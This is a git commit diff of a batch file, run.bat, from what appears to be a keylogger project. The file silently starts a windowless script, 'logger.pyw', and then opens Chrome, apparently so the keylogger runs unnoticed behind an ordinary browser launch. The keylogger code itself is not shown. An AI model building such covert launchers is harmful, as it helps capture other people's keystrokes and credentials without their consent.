369d09556119b5e57018ce701a91ad4b9fbca9b3
lucaboieru <luca.boieru@yahoo.com>
2014-01-03 02:20:14 +0200

    Removed hardcoded path of python script

--- run.bat
+++ run.bat
@@ -1,4 +1,8 @@
 @echo off
-:: hardcoded paths... to be improved
-start "" "c:\Programare\keylogger\logger.pyw"
+
+:: hardcoded keylogged application path
+set "logger=logger.pyw"
+set "path=%~dp0%logger%"
+
+start "" %path%
 start "" "c:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
